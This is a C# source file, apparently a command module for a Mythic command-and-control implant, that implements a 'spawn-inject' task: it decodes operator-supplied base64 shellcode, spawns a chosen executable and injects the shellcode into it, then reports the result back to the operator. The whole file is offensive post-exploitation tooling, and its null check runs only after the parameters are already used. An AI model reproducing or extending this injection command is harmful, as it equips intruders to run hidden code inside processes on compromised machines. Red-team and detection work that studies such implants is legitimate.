using Injection;

using Models.Tasks;

using Extend;
using System.Text;
using System;

namespace Tasks.Commands
{
    public class SpawnInject : CerberusCommand
    {
        public override string Name => "spawn-inject";

        public override MythicTaskResult Execute(MythicTask task)
        {
            MythicTaskResult result;

            var Arguments = Encoding.UTF8.GetBytes(task.parameters).Deserialize<SpawnInjectParam>();

            var FileBytes = Convert.FromBase64String(Arguments.file);

            if (Arguments is null || Arguments.path is null)
            {
                result = new MythicTaskResult
                {
                    task_id = task.id,
                    user_output = "No path specified. Please specify the path the executable you want to inject into",
                    completed = true,
                    status = "Error",
                    error = "No path speicified"
                };
                return result;
            }

            var injector = new SpawnInjector();
            var success = injector.Inject(FileBytes, 0, Arguments.path);

            if (success)
            {
                result = new MythicTaskResult
                {
                    task_id = task.id,
                    user_output = "Shellcode injected",
                    completed = true,
                    status = "success",
                };
            }
            else
            {
                result = new MythicTaskResult
                {
                    task_id = task.id,
                    user_output = "Failed to inject shellcode",
                    completed = true,
                    status = "Error",
                    error = "Failed to inject shellcode"
                };
            }

            return result;
        }
    }

    public class SpawnInjectParam
    {
        public string file { get; set; }
        public string path { get; set; }
    }
}
